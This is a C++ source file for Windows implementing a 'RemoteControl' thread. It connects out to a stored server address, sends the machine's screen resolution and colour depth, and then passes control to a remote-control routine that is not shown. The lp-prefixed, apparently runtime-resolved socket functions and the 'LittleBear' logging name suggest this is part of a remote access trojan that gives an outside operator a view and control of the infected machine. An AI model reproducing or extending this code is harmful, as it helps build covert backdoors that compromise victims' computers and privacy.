

#include <windows.h>
#include "RemoteControlProc.h"










DWORD __stdcall RemoteControl(LPVOID)
{
	try{
		int iRet = 0;
		SOCKET hSock = lpsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if (hSock == SOCKET_ERROR)
		{
			WriteLittleBearLog("RemoteControlProc lpsocket error\r\n");
			return FALSE;
		}
		DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock,SOL_SOCKET,SO_SNDTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
		{
			WriteLittleBearLog("RemoteControlProc lpsend time lpsetsockopt error code\r\n");
			lpclosesocket(hSock);
			return FALSE;
		}

		dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock,SOL_SOCKET,SO_RCVTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
		{
			WriteLittleBearLog("RemoteControlProc lprecv time lpsetsockopt error code\r\n");
			lpclosesocket(hSock);
			return FALSE;
		}

		iRet = lpconnect(hSock,(sockaddr*)&stServRemoteCtrlAddr,sizeof(sockaddr_in));
		if (iRet == SOCKET_ERROR)
		{
			lpclosesocket(hSock);
			WriteLittleBearLog("RemoteControlProc lpconnect error\r\n");
			return FALSE;
		}


		char * lpBuf = new char[REMOTECONTROL_BUFFER_SIZE];
		if (lpBuf == 0)
		{
			lpclosesocket(hSock);
			WriteLittleBearLog("RemoteControlProc new buf error\r\n");
			return FALSE;
		}

		int zlibBufSize = REMOTECONTROL_BUFFER_SIZE/2;
		char * lpZlibBuf = new char [zlibBufSize];
		if(lpZlibBuf == 0)
		{
			lpclosesocket(hSock);
			delete [] lpBuf;
			WriteLittleBearLog("RemoteControlProc new buf error\r\n");
			return FALSE;
		}

		char * lpBackup = new char[REMOTECONTROL_BUFFER_SIZE];
		if (lpBackup == 0)
		{
			lpclosesocket(hSock);
			delete [] lpBuf;
			delete []lpZlibBuf;
			WriteLittleBearLog("RemoteControlProc new buf error\r\n");
			return FALSE;
		}

		STREMOTECONTROLPARAMS param = {ScrnResolutionX,ScrnResolutionY,REMOTEBMP_BITSPERPIXEL};
		iRet = SendCmdPacketWithParam(hSock,REMOTECONTROL_PARAMS,(char*)&param,sizeof(STREMOTECONTROLPARAMS));
		if (iRet <= 0)
		{
			lpclosesocket(hSock);
			delete []lpZlibBuf;
			delete [] lpBuf;
			delete []lpBackup;
			WriteLittleBearLog("RemoteControlProc SendCmdPacket error\r\n");
			return FALSE;
		}

		iRet = RecvCmdPacket(hSock);
		if (iRet <= 0 || iRet != RECV_DATA_OK)
		{
			lpclosesocket(hSock);
			delete []lpZlibBuf;
			delete [] lpBuf;
			delete []lpBackup;
			WriteLittleBearLog("RemoteControlProc RecvCmdPacket error\r\n");
			return FALSE;
		}

		iRet = RemoteControlProc(REMOTEBMP_BITSPERPIXEL,lpBuf,REMOTECONTROL_BUFFER_SIZE,lpZlibBuf,zlibBufSize,hSock,lpBackup);

		delete []lpBuf;
		delete []lpZlibBuf;
		delete []lpBackup;
		lpclosesocket(hSock);
		return FALSE;
	}
	catch(...){
		WriteLittleBearLog("RemoteControl unhandled exception\r\n");
		return FALSE;
	}
}
